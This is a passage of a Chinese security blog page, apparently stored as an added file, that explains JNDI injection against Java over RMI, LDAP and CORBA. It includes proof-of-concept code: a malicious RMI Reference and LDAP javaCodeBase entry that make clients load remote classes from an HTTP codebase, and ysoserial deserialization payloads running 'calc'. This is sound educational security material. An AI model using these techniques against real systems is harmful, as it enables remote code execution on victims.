@@ -1,0 +1,656 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+          浅谈JNDI - Kingkk&#39;s Blog
+        
+    </title>
+
+    <link rel="canonical" href="https://www.kingkk/2020/04/浅谈JNDI/">
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/hux-blog.min.css">
+
+    <!-- Pygments Highlight CSS -->
+    <link rel="stylesheet" href="/css/highlight.css">
+
+    <!-- Custom Fonts -->
+    <!-- <link href="https://maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css"> -->
+    <!-- Hux change font-awesome CDN to qiniu -->
+    <link href="https://cdn.staticfile.org/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+
+    <!-- Hux Delete, sad but pending in China
+    <link href='http://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/
+    css'>
+    -->
+
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+
+<!-- hack iOS CSS :active style -->
+<body ontouchstart="">
+
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+    <div class="container-fluid">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Kingkk&#39;s Blog</a>
+        </div>
+
+        <!-- Collect the nav links, forms, and other content for toggling -->
+        <!-- Known Issue, found by Hux:
+            <nav>'s height woule be hold on by its content.
+            so, when navbar scale out, the <nav> will cover tags.
+            also mask any touch event of tags, unfortunately.
+        -->
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">Home</a>
+                    </li>
+
+                    
+
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/about/">About</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/archives/">Archives</a>
+                        </li>
+                        
+                    
+
+                        
+                        <li>
+                            <a href="/tags/">Tags</a>
+                        </li>
+                        
+                    
+                    
+                </ul>
+            </div>
+        </div>
+        <!-- /.navbar-collapse -->
+    </div>
+    <!-- /.container -->
+</nav>
+<script>
+    // Drop Bootstarp low-performance Navbar
+    // Use customize navbar with high-quality material design animation
+    // in high-perf jank-free CSS3 implementation
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        // CLOSE
+            $navbar.className = " ";
+            // wait until animation end.
+            setTimeout(function(){
+                // prevent frequently toggle
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        // OPEN
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+    <!-- Main Content -->
+    
+<!-- Image to hack wechat -->
+<!-- <img src="https://www.kingkk/img/icon_wechat.png" width="0" height="0"> -->
+<!-- <img src="{{ site.baseurl }}/{% if page.header-img %}{{ page.header-img }}{% else %}{{ site.header-img }}{% endif %}" width="0" height="0"> -->
+
+<!-- Post Header -->
+<style type="text/css">
+    header.intro-header{
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+<header class="intro-header" >
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                          <a class="tag" href="/tags/#java" title="java">java</a>
+                        
+                          <a class="tag" href="/tags/#JNDI" title="JNDI">JNDI</a>
+                        
+                    </div>
+                    <h1>浅谈JNDI</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        Posted by kingkk on
+                        2020-04-01
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+
+    <!-- Post Container -->
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                <h1 id="关于JNDI"><a href="#关于JNDI" class="headerlink" title="关于JNDI"></a>关于JNDI</h1><blockquote>
+<p> <strong>Java命名和目录接口</strong>（Java Naming and Directory Interface，缩写<strong>JNDI</strong>），是Java的一个目录服务应用程序接口（API），它提供一个目录系统，并将服务名称与对象关联起来，从而使得开发人员在开发过程中可以使用名称来访问对象 。</p>
+</blockquote>
+<p>可以理解为一个Java抽象出来统一与命名服务或者目录服务交互的接口。比如需要访问DNS服务、LDAP服务、RMI等，都可以通过一层抽象JNDI的API接口进行统一的处理。</p>
+<p>这里涉及到两个概念</p>
+<p>1、Naming Service 命名服务</p>
+<p>​    它提供一种类似Map的绑定工作，你可以根据名称获取到你想要的值，通过<code>lookup</code>或者<code>search</code>之类的操作。</p>
+<p>2、Directory Service 目录服务</p>
+<p>​    一种特殊的命名服务，和命名服务的区别是提供了属性与对象的关联，但整体功能差不多，也是提供对象的查找。</p>
+<p>以现代分布式的角度来类比的话可以看作是注册中心。</p>
+<p>整个JNDI主要分为三层面：</p>
+<p>1、JNDI API 用与我们Java应用与其通信。</p>
+<p>2、Naming Manager也就是我们之前提到的命名服务</p>
+<p>3、JNDI SPI（Server Provider Interface）用于具体到实现的方法上。</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200329195746.png" alt></p>
+<p>最早提出通过JNDI来攻击Java应用的是在2016的Black Hat上。</p>
+<ul>
+<li><p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf</a> </p>
+</li>
+<li><p><a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE-wp.pdf</a> </p>
+</li>
+<li><p><a href="https://www.youtube.com/watch?v=Y8a5nB-vy78" target="_blank" rel="noopener">https://www.youtube.com/watch?v=Y8a5nB-vy78</a> </p>
+</li>
+</ul>
+<p>其中介绍了三种JNDI的方式</p>
+<ul>
+<li>RMI</li>
+<li>LDAP</li>
+<li>CORBA</li>
+</ul>
+<p>前两种也就是目前比较常见的漏洞利用方式，不少的java漏洞都会涉及到恶意RMI、LDAP服务的利用，可以通过marshalsec很轻松的搭建起这样的服务。</p>
+<p>这篇文章也会围绕这个2016年的议题展开，主要就是这三种JNDI的利用，以及其中的一些原理。</p>
+<h1 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h1><h2 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h2><p>就像stackoverflow中介绍的，Context主要描述的是当前环境的上下文。</p>
+<p> <a href="https://stackoverflow.com/questions/3918083/what-exactly-is-a-context-in-java" target="_blank" rel="noopener">https://stackoverflow.com/questions/3918083/what-exactly-is-a-context-in-java</a> </p>
+<p>例如Servlet中就有描述当前Servlet环境的ServletContext。</p>
+<p>在JNDI中经常是一个InitialContext，来描述当前上下文。（当然你需要给定一些参数，告诉他如何初始化这个上下文）</p>
+<h2 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h2><p>Java中的远程方法调用，基于Java的序列化和反序列化传递数据。</p>
+<p>是Java应用自带的RPC调用，Weblogic中对其做了修改与优化，称为T3。</p>
+<h2 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h2><p>轻型目录访问协议（Lightweight Directory Access Protocol) LDAP目录以树状的层次结构来存储数据。</p>
+<p>之前介绍过目录服务与命名服务最大的区别就是可以通过属性与对象关联。</p>
+<p>如下就是一些常用的标识，用来确定唯一的对象，除此之外，用户还可以自定义添加attributes属性</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200329222650.png" alt></p>
+<h2 id="CORBA"><a href="#CORBA" class="headerlink" title="CORBA"></a>CORBA</h2><p>一种跨语言层面的远程调用规范，通过IDL定义接口，实现不同语言直接的远程通信。</p>
+<p>具体的概念可以看lucifaer师傅的文章，讲的很详细，如果之前没有了解过的可能会有些吃力。</p>
+<p> <a href="https://lucifaer.com/2020/02/20/Java CORBA研究/" target="_blank" rel="noopener">https://lucifaer.com/2020/02/20/Java%20CORBA%E7%A0%94%E7%A9%B6/</a> </p>
+<h2 id="RMI-IIOP"><a href="#RMI-IIOP" class="headerlink" title="RMI-IIOP"></a>RMI-IIOP</h2><blockquote>
+<p> RMI-IIOP出现以前，只有RMI和CORBA两种选择来进行分布式程序设计，二者之间不能协作。RMI-IIOP综合了RMI 和CORBA的优点，克服了他们的缺点，使得程序员能更方便的编写分布式程序设计，实现分布式计算。RMI-IIOP综合了RMI的简单性和CORBA的多语言性兼容性，RMI-IIOP克服了RMI只能用于Java的缺点和CORBA的复杂性（可以不用掌握IDL）。 </p>
+</blockquote>
+<p>简单来说就是结合了RMI和CORBA，既可以保持原有的RMI编程方式，同时也遵循了CORBA的通信规范。</p>
+<p>议题中所提到的CORBA，其实应该指的就是RMI-IIOP。</p>
+<h1 id="JNDI利用"><a href="#JNDI利用" class="headerlink" title="JNDI利用"></a>JNDI利用</h1><p>可以配合 <a href="https://github.com/kingkaki/jndi-sample" target="_blank" rel="noopener">https://github.com/kingkaki/jndi-sample</a> </p>
+<h2 id="RMI-1"><a href="#RMI-1" class="headerlink" title="RMI"></a>RMI</h2><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>我们可以通过如下方式很快的搭建起一个RMI服务</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Service</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function">String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ServiceImpl</span> <span class="keyword">extends</span> <span class="title">UnicastRemoteObject</span> <span class="keyword">implements</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">ServiceImpl</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> <span class="keyword">throws</span> RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"return hello"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">"hello"</span>, <span class="keyword">new</span> ServiceImpl());</span><br><span class="line">        Thread.currentThread().join();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到我们往1099端口上绑定了一个继承了<code>UnicastRemoteObject</code>的具体服务实现。</p>
+<p>然后客户端就可以在这个rmi服务上与服务端进行通信。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.rmi.registry.RegistryContextFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">"rmi://localhost:1099"</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        Service service = (Service) ctx.lookup(<span class="string">"hello"</span>);</span><br><span class="line">        System.out.println(service.sayHello());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>可以看到提供了两个参数<code>Context.INITIAL_CONTEXT_FACTORY</code>、<code>Context.PROVIDER_URL</code>分别表示Context初始化的工厂方法，和提供服务的url。</p>
+<p>然后就可以很轻松的拿到这个远端对象并调用。（具体的实现是个代理，通过rpc进行远端通信，毕竟不可能真的把一个类绑定然后传输）</p>
+<p>这样就实现了RMI的通信。</p>
+<h3 id="攻击client"><a href="#攻击client" class="headerlink" title="攻击client"></a>攻击client</h3><p>按照常规的思路，我们只要伪造一个服务端，然后返回恶意的序列化Payload，客户端收到结果之后肯定会触发Java的反序列化（因为rmi就是基于Java的序列化进行传输数据的）。</p>
+<p>但是其实这是对返回的类型比较限制的，但是应该也可以用直接修改返回数据的方式触发。</p>
+<p>JNDI中有一个更好的利用方式，涉及到命名引用的概念<code>javax.naming.Reference</code></p>
+<p>例如一些本地实例类过于大的情况，可以选择一个远程引用，通过远程调用的方式，引用远程的类。这也就是我们jndi利用payload中还会涉及到一个HTTP服务的原因。</p>
+<p>RMI服务只会返回一个命名引用，告诉JNDI应用你该如何去寻找这个类，然后应用则会去HTTP服务下找到对应类的class文件并加载，我们只要将恶意代码写入static中，则会在类加载时被执行。</p>
+<p>大致流程如下</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/1585487522.jpg" alt></p>
+<p>所以，只要修改一下我们的server端，绑定一个恶意的命名引用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    Registry registry = LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line"></span><br><span class="line">    Reference reference = <span class="keyword">new</span> Reference(<span class="string">"Calc"</span>, <span class="string">"Calc"</span>, <span class="string">"http://127.0.0.1:5000/"</span>);</span><br><span class="line">    ReferenceWrapper referenceWrapper = <span class="keyword">new</span> ReferenceWrapper(reference);</span><br><span class="line">    registry.bind(<span class="string">"hello"</span>, referenceWrapper);</span><br><span class="line"></span><br><span class="line">    Thread.currentThread().join();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>其中Reference的三个变量分别为</p>
+<ol>
+<li>className - 远程加载时所使用的类名，如果本地找不到这个类名，就去远程加载</li>
+<li>classFactory - 远程的工厂类</li>
+<li>classFactoryLocation - 工厂类加载的地址，可以是file://、ftp://、http:// 等协议</li>
+</ol>
+<p>这样，client端再次访问时，就回去加载远程的恶意class文件</p>
+<p>（需要注意的是，高版本的java需要设置<code>com.sun.jndi.rmi.object.trustURLCodebase</code>属性为true，算是一些限制）</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200329211822.png" alt></p>
+<h3 id="攻击server"><a href="#攻击server" class="headerlink" title="攻击server"></a>攻击server</h3><p>之前提到的方式是攻击一个要连接RMI服务的client端，那如何去攻击一个提供RMI服务的server端呢？</p>
+<p>能想到的有两种方式，在发送数据的时候发送一个序列化Payload，或者在bind对象的时候绑定一个序列化Payload。</p>
+<p>关于bind Payload的方法，貌似ysoserial中有现成的<code>ysoserial.exploit.RMIRegisteryExploit</code></p>
+<p>简化下之后关键代码如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(name, payload), Remote<span class="class">.<span class="keyword">class</span>)</span>;</span><br><span class="line">registry.bind(name, remote);</span><br></pre></td></tr></table></figure>
+<p>此外还发现了一个<code>ysoserial.exploit.JRMPClient</code>利用它也可以攻击服务端，但是原理貌似与bind有些区别</p>
+<p>详细可以看下这篇文章 <a href="https://xz.aliyun.com/t/2651" target="_blank" rel="noopener">https://xz.aliyun.com/t/2651</a> </p>
+<p>但是因为JEP290的关系，在jdk8u121、jdk7u131、jdk6u141之后对序列化的对象做了限制，两种方法都不能使用了（准确的说法是反序列化的Payload被拒绝反序列化了）。</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputFilter REJECTED: class java.util.PriorityQueue,<span class="built_in"> array </span>length: -1, nRefs: 2, depth: 1, bytes: 124, ex: n/a</span><br><span class="line"></span><br><span class="line"> ObjectInputFilter REJECTED: class sun.reflect.annotation.AnnotationInvocationHandler,<span class="built_in"> array </span>length: -1, nRefs: 8, depth: 2, bytes: 298, ex: n/a</span><br></pre></td></tr></table></figure>
+<p>但是低版本还是可以用罢了。</p>
+<p>那还剩一个发送序列化参数的方法，假如参数是一个Object对象，那么就可以传入我们恶意的序列化字节码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service.sayHello(<span class="keyword">new</span> CommonsCollections2().getObject(<span class="string">"calc"</span>))</span><br></pre></td></tr></table></figure>
+<p>这种方式不存在什么版本限制，都是可以利用的。但是Object参数的要求未免太过苛刻。</p>
+<p>之前还有师傅提出了通过javaagent动态修改字节码，或者抓包修改传输流的方式绕过这个限制（毕竟类型检查仅在jvm中，在传输之前肯定会转换成字节流方式），而且已经有师傅实现了这个。</p>
+<p> <a href="https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/" target="_blank" rel="noopener">https://mogwailabs.de/blog/2019/03/attacking-java-rmi-services-after-jep-290/</a> </p>
+<p> <a href="https://www.anquanke.com/post/id/200860" target="_blank" rel="noopener">https://www.anquanke.com/post/id/200860</a> </p>
+<p>其实假如是个参数是个接口类型，还可以用ysoserial中常用的Proxy代理直接在代码成面转换类型。</p>
+<h2 id="LDAP-1"><a href="#LDAP-1" class="headerlink" title="LDAP"></a>LDAP</h2><h3 id="Demo-1"><a href="#Demo-1" class="headerlink" title="Demo"></a>Demo</h3><p>LDAP服务的搭建，需要借助一个外部依赖</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compile <span class="string">group:</span> <span class="string">"com.unboundid"</span>, <span class="string">name:</span> <span class="string">"unboundid-ldapsdk"</span>, <span class="string">version:</span> <span class="string">"4.0.9"</span></span><br></pre></td></tr></table></figure>
+<p>然后就可以建立一个基于内存的LDAP服务，并往其中添加了两个entry（dn为唯一标识，后面的为标记属性。第一个entry为第二个entry的parent entry，所以需要创建第一个才能创建第二个。）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapServer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        InMemoryDirectoryServerConfig config = <span class="keyword">new</span> InMemoryDirectoryServerConfig(<span class="string">"dc=example,dc=com"</span>);</span><br><span class="line">        config.setListenerConfigs(<span class="keyword">new</span> InMemoryListenerConfig(</span><br><span class="line">                <span class="string">"listen"</span>, <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                InetAddress.getByName(<span class="string">"0.0.0.0"</span>), <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">                <span class="number">1389</span>,</span><br><span class="line">                ServerSocketFactory.getDefault(),</span><br><span class="line">                SocketFactory.getDefault(),</span><br><span class="line">                (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">        config.setSchema(<span class="keyword">null</span>);</span><br><span class="line">        config.setEnforceAttributeSyntaxCompliance(<span class="keyword">false</span>);</span><br><span class="line">        config.setEnforceSingleStructuralObjectClass(<span class="keyword">false</span>);</span><br><span class="line"></span><br><span class="line">        InMemoryDirectoryServer ds = <span class="keyword">new</span> InMemoryDirectoryServer(config);</span><br><span class="line">        ds.add(<span class="string">"dn: "</span> + <span class="string">"dc=example,dc=com"</span>, <span class="string">"k: k"</span>);</span><br><span class="line">        ds.add(<span class="string">"dn: "</span> + <span class="string">"uid=kingkk,dc=example,dc=com"</span>, <span class="string">"k: kk"</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">"Listening on 0.0.0.0:"</span> + <span class="number">1389</span>); <span class="comment">//$NON-NLS-1$</span></span><br><span class="line">        ds.startListening();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后客户端，通过对应的属性，就可以找到对应的对象，返回的是一个<code>com.sun.jndi.ldap.LdapCtx</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LdapClient</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Hashtable env = <span class="keyword">new</span> Hashtable();</span><br><span class="line">        env.put(Context.INITIAL_CONTEXT_FACTORY, <span class="string">"com.sun.jndi.ldap.LdapCtxFactory"</span>);</span><br><span class="line">        env.put(Context.PROVIDER_URL, <span class="string">"ldap://127.0.0.1:1389"</span>);</span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext(env);</span><br><span class="line">        Object object = ctx.lookup(<span class="string">"uid=kingkk,dc=example,dc=com"</span>);</span><br><span class="line">        System.out.println(object.getClass());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="攻击client-1"><a href="#攻击client-1" class="headerlink" title="攻击client"></a>攻击client</h3><p>基于之前RMI的命名引用的利用方式，那LDAP有没有类似的方法来引用远程的类（显然是有的，不然你之前ldap的利用咋利用的）</p>
+<p>我们仿照marshalsec的做法，为entry添加几条额外的Attributes</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ds.add(<span class="string">"dn: "</span> + <span class="string">"uid=kingkk,dc=example,dc=com"</span>, <span class="string">"javaCodeBase: http://127.0.0.1:5000/"</span>,</span><br><span class="line"><span class="string">"objectClass: javaNamingReference"</span>, <span class="string">"javaFactory: Calc"</span>, <span class="string">"javaClassName: foo"</span>);</span><br></pre></td></tr></table></figure>
+<p>这样一来，再次启动LDAP client，来获取这个dn的对象时，就会和RMI一样，引用到外部的类，从而触发漏洞。</p>
+<p>（高版本还是会有限制，但是这个版本比较高，jdk8u_2xx的样子，所以大部分情况还是能用）</p>
+<p><img src="https://raw.githubusercontent.com/kingkaki/cloud-img/master/img/20200329232321.png" alt></p>
+<h3 id="攻击server-1"><a href="#攻击server-1" class="headerlink" title="攻击server"></a>攻击server</h3><p>目前市面上的文章好像没有提到过这点的</p>
+<p>当我自己尝试绑定一个恶意对象的到LDAP服务器中，是触发不了反序列化的，只有在client再次调用的时候，client端才能触发反序列化。</p>
+<h2 id="CORBA-RMI-IIOP"><a href="#CORBA-RMI-IIOP" class="headerlink" title="CORBA(RMI-IIOP)"></a>CORBA(RMI-IIOP)</h2><h3 id="Demo-2"><a href="#Demo-2" class="headerlink" title="Demo"></a>Demo</h3><p>和RMI一样先定义好对应的接口（注意这回继承的是<code>PortableRemoteObject</code>）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HelloInterface</span> <span class="keyword">extends</span> <span class="title">Remote</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">( String from )</span> <span class="keyword">throws</span> RemoteException</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloImpl</span> <span class="keyword">extends</span> <span class="title">PortableRemoteObject</span> <span class="keyword">implements</span> <span class="title">HelloInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">HelloImpl</span><span class="params">()</span> <span class="keyword">throws</span> java.rmi.RemoteException </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>();     <span class="comment">// invoke rmi linking and remote object initialization</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">(String from)</span> <span class="keyword">throws</span> java.rmi.RemoteException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello from "</span> + from + <span class="string">"!!"</span>);</span><br><span class="line">        System.out.flush();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>服务端和之前RMI的逻辑类似，绑定一个实现类</p>
